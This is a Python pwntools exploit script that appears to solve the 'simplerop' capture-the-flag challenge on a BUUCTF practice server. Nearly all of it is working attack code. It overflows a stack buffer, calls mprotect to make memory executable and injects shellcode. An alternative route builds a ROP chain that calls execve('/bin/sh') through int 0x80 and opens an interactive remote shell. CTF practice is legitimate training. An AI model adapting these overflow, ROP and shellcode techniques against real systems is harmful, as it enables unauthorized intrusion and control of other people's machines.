from pwn import *
from LibcSearcher import *
context.arch='i386'

# the program was static complied, so just use the mprotect to change some segment's policy to execve shellcode,
# or get shell by int 0x80(execve("/bin/sh",0,0)) in the program

# p = process('../Desktop/simplerop')
p = remote('node3.buuoj.cn',28168)
elf = ELF('../Desktop/simplerop',checksec=False)

def shellcode():
	mprotect_addr = elf.sym['mprotect']
	shellcode_addr = 0x080E9000
	main = elf.sym['main']
	shellcode = asm(shellcraft.sh())
	payload = 'A'*0x20 + p32(mprotect_addr) + p32(main) + p32(shellcode_addr) + p32(len(shellcode)) + p32(0x7)
	# the length of overflow need to debug to find it
	# mprotect(const void *start, size_t len, int prot),0x7 means this part of menmory could be read,write,execve
	p.send(payload)
	sleep(1)

	gets_plt = elf.sym['read']
	payload = 'A'*0x18 + p32(gets_plt) + p32(shellcode_addr) + p32(0) + p32(shellcode_addr) + p32(len(shellcode))
	# the length of overflow was changed, when debug could find it
	# get shellcode to section .bss
	p.send(payload)
	sleep(1)
	p.sendline(shellcode)
	sleep(1)
	p.interactive()

def int80():
	main = elf.sym['main']
	read_addr = elf.sym['read']
	bss_addr = 0x080EAFB4
	int80_addr = 0x080493e1 # int 0x80
	gadgets1 = 0x0809da8a # pop eax ; pop ebx ; pop esi ; pop edi ; ret
	gadgets2 = 0x0806e850 # pop edx ; pop ecx ; pop ebx ; ret
	payload = 'A'*0x20 + flat([read_addr, main, 0, bss_addr, 8])
	# the length of overflow need to debug to find it
	p.recvuntil("Your input :")
	p.send(payload)
	sleep(1)
	p.send('/bin/sh\x00')
	p.recvuntil("Your input :")

	payload = 'A'*0x18 + flat([gadgets1, 0xb, bss_addr, 0, 0, gadgets2, 0, 0, bss_addr, int80_addr])
	# prepare the register for int 0x80 to excute funtction execve("/bin/sh",0,0)
	# the length of overflow was changed, when debug could find it
	p.send(payload)
	sleep(1)
	p.interactive()
int80() # this way could get shell both local and server
# shellcode() # this way could get shell locally